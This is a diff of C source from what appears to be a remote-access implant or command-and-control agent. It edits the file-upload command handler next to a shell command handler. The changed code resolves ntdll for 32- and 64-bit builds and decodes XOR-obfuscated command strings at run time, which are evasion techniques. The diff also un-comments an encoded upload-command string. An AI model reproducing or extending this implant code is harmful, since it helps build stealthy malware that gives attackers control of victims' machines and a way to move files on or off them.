@@ -322,16 +322,19 @@ VOID CommandShell( PPARSER Parser ){
 VOID CommandUpload( PPARSER Parser ) {
 
 //--------------------------------
+
+
+
+#if CONFIG_NATIVE == TRUE
+
 #if CONFIG_ARCH == 64
     void *p_ntdll = get_ntdll_64();
 #else
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
-
-#if CONFIG_NATIVE == TRUE
     unsigned char s_xk[] = S_XK;
-    // unsigned char s_string[] = S_COMMAND_UPLOAD;
+    unsigned char s_string[] = S_COMMAND_UPLOAD;
     // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
 
     PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
